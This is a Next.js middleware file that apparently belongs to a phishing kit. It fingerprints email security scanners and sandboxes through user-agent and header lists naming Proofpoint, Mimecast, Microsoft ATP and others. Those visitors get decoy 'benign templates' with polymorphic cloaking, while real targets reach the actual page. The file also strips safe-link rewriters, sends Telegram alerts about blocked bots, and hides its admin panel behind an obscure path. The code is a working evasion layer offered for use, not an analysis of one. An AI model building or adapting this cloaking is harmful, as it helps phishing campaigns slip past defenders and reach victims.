import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
import { checkNetworkRestrictions } from './lib/networkRestrictions'
import { detectBotWithCloudflare } from './lib/cloudflareBotManagement'
import { classifyRequest, getRandomSafeRedirect } from './lib/scannerDetection'
import { isIPBlocked } from './lib/ipBlocklist'
import { smartDetectSandbox } from './lib/smartSandboxDetection'
import { getRandomTemplate } from './lib/benignTemplates'
import { bypassSafeLinkRewriter } from './lib/stealth/linkCloaking'

// Middleware runs in Edge runtime by default (faster, works with Web Crypto API)

// Silent scanner detection
// Note: /mamacita and /api/admin are legitimate routes, not suspicious
const suspiciousPatterns = [
  '/wp-', '/php', '/.env', '/.git',
  '/config', '/backup', '/test', '/debug',
  '/administrator', '/phpmyadmin', '/hidden',
  '/secret', '/database', '/console'
]

const isSuspiciousPath = (path: string) => {
  return suspiciousPatterns.some(pattern => path.includes(pattern))
}

// Whitelist legitimate admin routes (hidden at /mamacita)
const isAdminRoute = (path: string) => {
  return path.startsWith('/mamacita') || path.startsWith('/api/mamacita')
}

type MiddlewareSettings = {
  security?: {
    gates?: {
      layer1BotFilter?: boolean
      layer1IpBlocklist?: boolean
      layer1ScannerDetection?: boolean
    }
    botFilter?: {
      confidenceThreshold?: number
    }
    enablePolymorphicCloaking?: boolean
    networkRestrictions?: {
      allowVpn?: boolean
      allowProxy?: boolean
      allowDatacenter?: boolean
    }
  }
  redirects?: {
    customUrl?: string
  }
  filtering?: {
    device?: {
      desktop?: boolean
      mobile?: boolean
      tablet?: boolean
    }
  }
}

const DEFAULT_EDGE_SETTINGS: MiddlewareSettings = {
  security: {
    gates: {
      layer1BotFilter: true,
      layer1IpBlocklist: true,
      layer1ScannerDetection: true,
    },
    botFilter: {
      confidenceThreshold: 70,
    },
    enablePolymorphicCloaking: true,
  },
  redirects: {
    customUrl: '',
  },
  filtering: {
    device: {
      desktop: true,
      mobile: true,
      tablet: true,
    },
  },
}

const SETTINGS_CACHE_TTL = 30_000
let middlewareSettingsCache: MiddlewareSettings = DEFAULT_EDGE_SETTINGS
let middlewareSettingsTimestamp = 0

async function loadMiddlewareSettings(origin: string): Promise<MiddlewareSettings> {
  const now = Date.now()
  if (middlewareSettingsCache && now - middlewareSettingsTimestamp < SETTINGS_CACHE_TTL) {
    return middlewareSettingsCache
  }
  
  try {
    const response = await fetch(`${origin}/api/security/gates-config`, {
      headers: {
        'x-middleware-fetch': 'true',
      },
      cache: 'no-store',
    })
    
    if (response.ok) {
      const data = await response.json()
      if (data?.settings) {
        middlewareSettingsCache = data.settings
        middlewareSettingsTimestamp = now
        return data.settings
      }
    }
  } catch (error) {
    if (process.env.NODE_ENV === 'development') {
      console.warn('[Middleware] Failed to load settings from API:', error)
    }
  }
  
  return middlewareSettingsCache || DEFAULT_EDGE_SETTINGS
}

// Helper function to log bot detection (non-blocking)
async function logBotDetection(
  request: NextRequest,
  ip: string,
  userAgent: string,
  reason: string,
  confidence: number = 0
) {
  try {
    // Make internal API call to log visitor
    const origin = request.nextUrl.origin
    await fetch(`${origin}/api/internal/log-visitor`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-internal-request': 'true', // Mark as internal request
      },
      body: JSON.stringify({
        ip,
        userAgent,
        botStatus: 'bot',
        layer: 'middleware',
        layerPassed: false,
        reason,
        confidence,
      }),
    }).catch(() => {
      // Silent fail - don't block middleware if logging fails
    })
  } catch (error) {
    // Silent fail - don't block middleware if logging fails
  }
}

function serializeHeaders(headers: Headers): Record<string, string> {
  const result: Record<string, string> = {}
  headers.forEach((value, key) => {
    result[key] = value
  })
  return result
}

export async function middleware(request: NextRequest) {
  // ====================================================================
  // STEP 1: MINIMAL DEBUG LOGGING (Middleware debugging ONLY)
  // ====================================================================
  const { pathname, search } = request.nextUrl
  const userAgent = request.headers.get('user-agent') || 'Unknown'
  const ip =
    request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('x-real-ip') ||
    request.headers.get('cf-connecting-ip') ||
    'Unknown'
  
  // Minimal debug logging - track entry point
  console.log('[MW:ENTER]', {
    path: pathname + search,
    method: request.method,
    ip: ip.substring(0, 20), // Truncate for readability
    userAgent: userAgent.substring(0, 80), // Truncate for readability
  })
  
  // Avoid recursive middleware executions when logging visitors
  if (pathname.startsWith('/api/internal/log-visitor')) {
    return NextResponse.next()
  }
  
  // =========================================================
  // FULL DEVELOPMENT BYPASS — MUST RUN BEFORE ANY SECURITY
  // =========================================================
const devIPs = ["::1", "127.0.0.1", "localhost", "::ffff:127.0.0.1"]

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD
if (!ADMIN_PASSWORD) {
  throw new Error('[Middleware] ADMIN_PASSWORD environment variable is required.')
}
  
  // -------------- DEV BYPASS CONTROL --------------
  const isLocalhost =
    devIPs.includes(ip) ||
    ip.startsWith('::ffff:127.0.0.1') ||
    ip.startsWith('127.0.0.1')

  const devBypassEnabled =
    process.env.NODE_ENV === 'development' &&
    isLocalhost &&
    process.env.DISABLE_DEV_BYPASS !== 'true'

  console.log('[MW:TEST] devBypassEnabled:', devBypassEnabled, '| IP:', ip)

  if (devBypassEnabled) {
    console.log("🟢 [DEV-BYPASS] Skipping ALL security checks for localhost", {
      ip,
      path: pathname + search
    })
    return NextResponse.next()
  }
  // ------------------------------------------------

  // Allow specific routes to bypass only when dev bypass is active
  if (devBypassEnabled && pathname.startsWith('/r/')) {
    return NextResponse.next()
  }
  
  // ====================================================================
  // ADMIN PANEL BYPASS - Must run BEFORE all security checks
  // ====================================================================
  // Allow admin panel and API routes to bypass ALL security checks
  // Admins may be accessing from datacenter IPs (VPS, Azure, AWS, etc.)
  const isAdminPath = pathname.startsWith('/mamacita') || pathname.startsWith('/api/admin')
  if (isAdminPath) {
    // Admin paths bypass all security checks (scanner detection, bot detection, network restrictions)
    // This allows admins to access from any IP without being blocked
    if (process.env.NODE_ENV === 'development') {
      console.log('[ADMIN-BYPASS] Allowing admin path through:', pathname)
    }
    return NextResponse.next()
  }
  // ====================================================================
  
  // 🚫 BLOCK OLD ADMIN PATH
  if (pathname.startsWith('/admin')) {
    console.log('[HONEYPOT] Someone tried /admin — redirecting to benign template')
    return NextResponse.rewrite(new URL('/benign-templates/corporate/index.html', request.url))
  }

  // ====================================================================
  // EARLY COMPREHENSIVE BOT DETECTION
  // ====================================================================
  // Early comprehensive bot detection - redirect bots/scanners before they see anything
  // Uses Cloudflare Bot Management + custom detection
  
  const referrer = request.headers.get('referer') || request.headers.get('referrer') || ''

  const forceBenignTemplate =
    process.env.NODE_ENV === 'development' &&
    /proofpoint|mimecast|curl|microsoft office 365 advanced threat protection/i.test(userAgent)

  if (forceBenignTemplate) {
    const forcedTemplateUrl = new URL('/benign-templates/restaurant/index.html', request.url)
    console.log('[BENIGN-TEST-MODE] Forcing restaurant template for UA:', userAgent.substring(0, 80))
    return NextResponse.rewrite(forcedTemplateUrl)
  }

  const detectionHeaders = serializeHeaders(request.headers)
  try {
    const scannerDetection = await classifyRequest(userAgent, ip, detectionHeaders)
    if (scannerDetection.isScanner) {
      if (isLocalhost && process.env.NODE_ENV === 'development') {
        console.warn('[Middleware] Scanner detected but running in localhost test mode; skipping safe-content rewrite.')
      } else {
      if (process.env.NODE_ENV === 'development') {
        console.warn('[Middleware] Scanner detected early:', {
          ip,
          userAgent: userAgent.substring(0, 80),
          confidence: scannerDetection.confidence,
          reasons: scannerDetection.reasons,
        })
      }
      await logBotDetection(
        request,
        ip,
        userAgent,
        scannerDetection.reasons?.join(', ') || 'Scanner detected',
        scannerDetection.confidence
      )
      if (scannerDetection.redirectUrl) {
        return NextResponse.redirect(scannerDetection.redirectUrl, 302)
      }
      const safeContentUrl = new URL('/api/stealth/safe-content', request.url)
      return NextResponse.rewrite(safeContentUrl)
      }
    }
  } catch (error) {
    if (process.env.NODE_ENV === 'development') {
      console.warn('[Middleware] Scanner detection failed:', error)
    }
  }

  // =========================================================
  // OPTION D: LINK CLOAKING - Bypass safe-link rewriters
  // =========================================================
  const fullUrl = request.url
  const linkCloakingResult = bypassSafeLinkRewriter(fullUrl)
  
  if (linkCloakingResult.bypassed && linkCloakingResult.cloakedUrl !== fullUrl) {
    // Rewrite URL to remove safe-link rewriter
    try {
      const restoredUrl = new URL(linkCloakingResult.cloakedUrl)
      const response = NextResponse.redirect(restoredUrl)
      
      if (process.env.NODE_ENV === 'development') {
        console.log('[LINK-CLOAKING] Bypassed safe-link rewriter', {
          rewriter: linkCloakingResult.detectedRewriter,
          techniques: linkCloakingResult.techniques,
        })
      }
      
      return response
    } catch {
      // Invalid URL, continue normally
    }
  }

  // ====================================================================
  // SECURITY BLOCKING - Replicate .htaccess rules
  // ====================================================================
  
  // Import blocking functions
  const { isIPBlocked: checkIPBlocked, isUserAgentBlocked, isReferrerBlocked } = await import('./lib/blockedLists')
  
  // Block malicious IPs (security scanners)
  if (checkIPBlocked(ip)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block malicious user agents (bots, scanners, security tools)
  if (isUserAgentBlocked(userAgent)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block threat intelligence referrers
  if (isReferrerBlocked(referrer)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block direct access to /page directory
  if (pathname.startsWith('/page')) {
    return NextResponse.json({ error: 'Not Found' }, { status: 404 })
  }
  
  // ====================================================================
  // END SECURITY BLOCKING
  // ====================================================================

  // Protect admin routes (except login)
  if (pathname.startsWith('/mamacita') && !pathname.startsWith('/mamacita/login')) {
    const authCookie = request.cookies.get('admin_auth')
    const sessionCookie = request.cookies.get('admin_session')
    
    // Check if cookies exist and password matches
    if (!authCookie || !sessionCookie || authCookie.value !== ADMIN_PASSWORD) {
      const loginUrl = new URL('/mamacita/login', request.url)
      const response = NextResponse.redirect(loginUrl)
      response.cookies.delete('admin_auth')
      response.cookies.delete('admin_session')
      return response
    }
    
    // Check session expiry
    try {
      const sessionData = JSON.parse(atob(sessionCookie.value))
      const now = Date.now()
      
      // Check if session has expired (30 minutes of inactivity)
      if (now > sessionData.expiry) {
        const loginUrl = new URL('/mamacita/login', request.url)
        const response = NextResponse.redirect(loginUrl)
        response.cookies.delete('admin_auth')
        response.cookies.delete('admin_session')
        return response
      }
      
      // Session valid - update last activity and extend expiry
      sessionData.lastActivity = now
      sessionData.expiry = now + (30 * 60 * 1000) // Extend by 30 minutes
      const newSessionToken = Buffer.from(JSON.stringify(sessionData)).toString('base64')
      
      const response = NextResponse.next()
      response.headers.set('X-Frame-Options', 'DENY')
      response.headers.set('X-Content-Type-Options', 'nosniff')
      
      // Update session cookie with new expiry
      response.cookies.set('admin_session', newSessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 30 * 60
      })
      response.cookies.set('admin_auth', ADMIN_PASSWORD, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 30 * 60
      })
      
      return response
    } catch (error) {
      // Invalid session data
      const loginUrl = new URL('/mamacita/login', request.url)
      const response = NextResponse.redirect(loginUrl)
      response.cookies.delete('admin_auth')
      response.cookies.delete('admin_session')
      return response
    }
  }

  // PHASE 7.4: Bypass security brain for management and email resolution routes
  // These routes should never be blocked by security brain
  if (
    pathname.startsWith('/api/management/') ||
    pathname.startsWith('/api/admin/') ||
    pathname.startsWith('/api/config/') ||
    pathname.startsWith('/api/link-config') ||
    pathname.startsWith('/api/email-from-token') ||
  pathname.startsWith('/api/email-from-mapping') ||
    (pathname.startsWith('/api/firewall/check') && request.method === 'POST')
  ) {
    return NextResponse.next()
  }

  // Skip detection for static files, API routes, admin routes (mamacita), and templates
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api') ||
    pathname.startsWith('/mamacita') ||
    pathname.startsWith('/benign-templates') ||
    pathname.startsWith('/favicon') ||
    pathname.includes('.')
  ) {
    return NextResponse.next()
  }

  // === PHASE 5.9: BEHAVIORAL SESSION TRACKING ===
  // Attach behavioral session header if needed
  let behaviorSession: string | null = null
  if (ip !== 'Unknown' && userAgent !== 'Unknown') {
    // Create session hash for behavioral tracking
    const sessionData = `${ip}|${userAgent}`
    let hash = 0
    for (let i = 0; i < sessionData.length; i++) {
      hash = ((hash << 5) - hash) + sessionData.charCodeAt(i)
      hash = hash & hash
    }
    behaviorSession = Math.abs(hash).toString(36)
  }

  const settings = await loadMiddlewareSettings(request.nextUrl.origin)
  
  // Skip security in development if configured
  if (process.env.NODE_ENV === 'development' && !settings.security?.gates?.layer1BotFilter) {
    const response = NextResponse.next()
    response.headers.set('X-Frame-Options', 'DENY')
    response.headers.set('X-Content-Type-Options', 'nosniff')
    // Phase 5.9: Attach behavioral session header
    if (behaviorSession) {
      response.headers.set('x-behavior-session', behaviorSession)
    }
    return response
  }

  // === PHASE 5.8: POLYMORPHIC CLOAKING (Mutation Key Generation) ===
  // Generate mutation key before firewall check
  let mutationKey: string | null = null
  
  let firewallResult: any = null
  try {
    const forwardedHeaders = serializeHeaders(request.headers)
    forwardedHeaders['x-forwarded-for'] = ip
    forwardedHeaders['x-real-ip'] = ip
    
    const firewallResponse = await fetch(`${request.nextUrl.origin}/api/internal/firewall-eval`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-internal-request': 'true',
      },
      body: JSON.stringify({
        url: request.url,
        method: request.method,
        headers: forwardedHeaders,
        middlewareBotScore: undefined,
        includeMutationKey: settings.security?.enablePolymorphicCloaking !== false,
      }),
    })
    
    if (firewallResponse.ok) {
      const data = await firewallResponse.json()
      if (data?.success) {
        firewallResult = data.result
        mutationKey = data.mutationKey ?? null
      }
    }
  } catch (error) {
    if (process.env.NODE_ENV === 'development') {
      console.warn('[Middleware] Firewall evaluation API failed:', error)
    }
  }

  if (firewallResult) {
    switch (firewallResult.action) {
      case 'benign': {
        if (process.env.NODE_ENV === 'development') {
          console.log('[FIREWALL-REWRITE] Serving benign template:', firewallResult.templateId)
        }
        await logBotDetection(
          request,
          ip,
          userAgent,
          `Firewall: ${firewallResult.reason.join(', ')}`,
          firewallResult.classificationScore
        ).catch(() => {})
        
        const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                               process.env.TELEGRAM_CHAT_ID &&
                               process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
        
        if (telegramEnabled) {
          await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'x-internal-request': 'true'
            },
            body: JSON.stringify({
              ip,
              userAgent,
              reason: `Firewall: ${firewallResult.reason.join(', ')}`,
              confidence: firewallResult.classificationScore,
              layer: 'middleware-firewall',
              blockedAt: new Date().toISOString()
            }),
          }).catch(() => {})
        }

        let templateUrl: URL
        if (mutationKey && settings.security?.enablePolymorphicCloaking !== false) {
          templateUrl = new URL(`/api/mutated-template?key=${mutationKey}&template=${firewallResult.templateId || 'corporate'}`, request.url)
        } else {
          templateUrl = new URL(`/benign-templates/${firewallResult.templateId}/index.html`, request.url)
        }
        
        const response = NextResponse.rewrite(templateUrl)
        if (mutationKey) {
          response.headers.set('x-mutation-key', mutationKey)
        }
        return response
      }

      case 'safe':
        await logBotDetection(
          request,
          ip,
          userAgent,
          `Firewall safe redirect: ${firewallResult.reason.join(', ')}`,
          firewallResult.classificationScore
        ).catch(() => {})
        
        return NextResponse.redirect(firewallResult.redirectUrl || getRandomSafeRedirect(), 302)

      case 'block':
        await logBotDetection(
          request,
          ip,
          userAgent,
          `Firewall blocked: ${firewallResult.reason.join(', ')}`,
          firewallResult.classificationScore
        ).catch(() => {})
        
        return new NextResponse('Forbidden', { status: 403 })

      case 'captcha':
        break

      case 'redirect':
        break

      default:
        break
    }
  }
  
  // If firewall didn't return early, continue to legacy detection
  // This ensures fail-open behavior

  // === LEGACY SMART SANDBOX DETECTION (Fallback) ===
  // Only runs if firewall fails or doesn't handle the case
  let smartDetectionResult: any = null
  try {
    // Use smart detection (distinguishes real users from sandboxes)
    smartDetectionResult = await smartDetectSandbox(request)

    // Only block HIGH CONFIDENCE sandboxes (80+)
    if (smartDetectionResult.isSandbox && smartDetectionResult.confidence >= 80) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        `Sandbox detected: ${smartDetectionResult.reasons.slice(0, 2).join(', ')}`,
        smartDetectionResult.confidence
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      // Check environment variables directly (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        // Call the internal notification API (it will handle settings check)
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: `Sandbox detected: ${smartDetectionResult.reasons.slice(0, 2).join(', ')}`,
            confidence: smartDetectionResult.confidence,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }

      // Serve benign template
      const template = getRandomTemplate('')
      const templateUrl = new URL(template.path, request.url)
      return NextResponse.rewrite(templateUrl)
    }

    // Domain threat check removed - function no longer exists
  } catch (error) {
    // On error, allow through (fail open)
  }

  // If smart detection confirmed real user, skip old bot detection
  if (smartDetectionResult && smartDetectionResult.realUserScore >= 50) {
    const response = NextResponse.next()
    response.headers.set('X-Frame-Options', 'DENY')
    response.headers.set('X-Content-Type-Options', 'nosniff')
    response.headers.set('Referrer-Policy', 'no-referrer')
    response.headers.set(
      'Content-Security-Policy',
      "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://challenges.cloudflare.com/turnstile/v0/api.js; style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://challenges.cloudflare.com https://api.telegram.org https://ipapi.co; frame-src https://challenges.cloudflare.com;"
    )
    return response
  }

  // Silent redirect for scanner paths
  if (isSuspiciousPath(pathname)) {
    const redirectUrl = settings.redirects?.customUrl || 'https://en.wikipedia.org/wiki/Cloud_computing'
    return NextResponse.redirect(new URL(redirectUrl, request.url))
  }

  // SECURITY CHECK 1: IP Blocklist (if enabled in settings)
  if (settings.security?.gates?.layer1IpBlocklist !== false) {
    if (await isIPBlocked(ip)) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        'IP in blocklist',
        100
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: 'IP in blocklist',
            confidence: 100,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // SECURITY CHECK 2: Network Restrictions (if enabled in settings)
  // Note: Network restrictions are checked as part of bot filter, but can also be checked here
  // For now, we'll check them if bot filter is enabled
  // Note: Admin paths already bypass all checks (returned early), so they won't reach here
  
  // BYPASS: Allow requests with token parameters to bypass network restrictions
  // These are legitimate user links that should be accessible even from datacenter IPs
  // Token validation will happen later in the page/API flow
  const searchParams = request.nextUrl.searchParams
  const hasTokenParam = searchParams.has('token') || pathname.includes('/t/') || pathname.includes('/r/')
  const isTokenLink = hasTokenParam && (pathname === '/' || pathname.startsWith('/t/') || pathname.startsWith('/r/'))
  
  if (isTokenLink && process.env.NODE_ENV === 'development') {
    console.log('[TOKEN-LINK-BYPASS] Allowing token link through network restrictions:', {
      path: pathname + search,
      hasToken: searchParams.has('token'),
    })
  }
  
  if (settings.security?.gates?.layer1BotFilter !== false && !isTokenLink) {
    // Debug: Log network restrictions settings (always log to debug production issues)
    console.log('[NETWORK-RESTRICTIONS] Settings check:', {
      hasNetworkRestrictions: !!settings.security?.networkRestrictions,
      allowVpn: settings.security?.networkRestrictions?.allowVpn,
      allowProxy: settings.security?.networkRestrictions?.allowProxy,
      allowDatacenter: settings.security?.networkRestrictions?.allowDatacenter,
      ip,
      path: pathname + search,
    })
    
    const networkCheck = await checkNetworkRestrictions(ip, settings as any)
    if (networkCheck.blocked) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        networkCheck.reason || 'Network restriction',
        80
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: networkCheck.reason || 'Network restriction',
            confidence: 80,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // Enhanced headers for security tool detection
  const allHeaders: Record<string, string | null> = {}
  const securityHeaders = [
    'x-proofpoint', 'x-mimecast', 'x-barracuda', 'x-forcepoint',
    'x-symantec', 'x-mcafee', 'x-trendmicro', 'x-sophos',
    'x-kaspersky', 'x-bitdefender', 'x-fireeye', 'x-checkpoint',
    'x-zscaler', 'x-fortinet', 'x-debug', 'x-test', 'x-inspector',
  ]
  
  securityHeaders.forEach(header => {
    allHeaders[header] = request.headers.get(header)
  })
  
  // Comprehensive bot detection with Cloudflare + security tool detection
  const detection = detectBotWithCloudflare(userAgent, ip, request.headers, {
    fingerprint: JSON.stringify(allHeaders),
  })

  // Silent detection - no logging

  // Enhanced detection: Check for security tool specific patterns
  const uaLower = userAgent.toLowerCase()
  const isSecurityTool = 
    uaLower.includes('proofpoint') ||
    uaLower.includes('mimecast') ||
    uaLower.includes('barracuda') ||
    uaLower.includes('forcepoint') ||
    uaLower.includes('symantec') ||
    uaLower.includes('mcafee') ||
    uaLower.includes('trendmicro') ||
    uaLower.includes('sophos') ||
    uaLower.includes('kaspersky') ||
    uaLower.includes('bitdefender') ||
    uaLower.includes('fireeye') ||
    uaLower.includes('checkpoint') ||
    uaLower.includes('zscaler') ||
    uaLower.includes('fortinet') ||
    securityHeaders.some(h => request.headers.get(h) !== null)

  // SECURITY CHECK 2.5: Device Access Control (if enabled in settings)
  try {
    if (settings.filtering?.device) {
      const { isDeviceAllowed } = await import('./lib/deviceDetection')
      const deviceCheck = isDeviceAllowed(userAgent, {
        allowDesktop: settings.filtering.device.desktop,
        allowMobile: settings.filtering.device.mobile,
        allowTablet: settings.filtering.device.tablet,
      })
      
      if (!deviceCheck.allowed) {
        await logBotDetection(
          request,
          ip,
          userAgent,
          `Device blocked: ${deviceCheck.reason}`,
          100
        ).catch(() => {})
        
        return new NextResponse(
          JSON.stringify({ 
            error: 'Access Denied',
            reason: deviceCheck.reason || 'Device type not allowed'
          }),
          { 
            status: 403,
            headers: { 'Content-Type': 'application/json' }
          }
        )
      }
    }
  } catch (error) {
    console.error('[MIDDLEWARE] Device detection error:', error)
  }

  // SECURITY CHECK 3: Bot Detection (if enabled in settings)
  if (settings.security?.gates?.layer1BotFilter !== false) {
    // Get threshold from settings
    const threshold = settings.security?.botFilter?.confidenceThreshold || 70
    
    // Only redirect on HIGH confidence bot detection (>= threshold) or explicit security tools
    // Allow legitimate users with low Cloudflare scores to proceed to CAPTCHA
    const shouldRedirect = 
      isSecurityTool || // Always redirect security tools
      (detection.confidence >= threshold && detection.isBot) || // High confidence bots only
      (detection.cloudflareScore?.automatedTool === true) || // Explicit automated tools
      (detection.cloudflareScore?.verifiedBot === true) // Verified bots

    if (shouldRedirect) {
      // Log bot detection to visitor tracker
      const botReason = isSecurityTool 
        ? 'Security tool detected' 
        : `Bot detected (confidence: ${detection.confidence}%)`
      
      await logBotDetection(
        request,
        ip,
        userAgent,
        botReason,
        detection.confidence
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: botReason,
            confidence: detection.confidence,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // SECURITY CHECK 4: Sandbox Detection (if enabled in settings)
  if (settings.security?.gates?.layer1ScannerDetection !== false) {
    // Use the existing smart sandbox detection that already runs above
    // This check is already handled in the smart detection section
  }

  // All checks passed - legitimate users will see CAPTCHA
  console.log('[MW:EXIT]', {
    path: pathname + search,
    action: 'ALLOW',
    reason: 'All checks passed',
  })
  
  const response = NextResponse.next()

  // Security headers
  response.headers.set('X-Frame-Options', 'DENY')
  response.headers.set('X-Content-Type-Options', 'nosniff')
  response.headers.set('Referrer-Policy', 'no-referrer')
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://challenges.cloudflare.com/turnstile/v0/api.js; style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://challenges.cloudflare.com https://api.telegram.org https://ipapi.co; frame-src https://challenges.cloudflare.com;"
  )
  
  // Phase 5.9: Attach behavioral session header
  if (behaviorSession) {
    response.headers.set('x-behavior-session', behaviorSession)
  }

  // HSTS (only on HTTPS)
  if (request.nextUrl.protocol === 'https:') {
    response.headers.set(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    )
  }

  // Cache control for API routes
  if (request.nextUrl.pathname.startsWith('/api/')) {
    response.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, private')
  }

  return response
}

export const config = {
  matcher: ['/((?!_next).*)'],
}

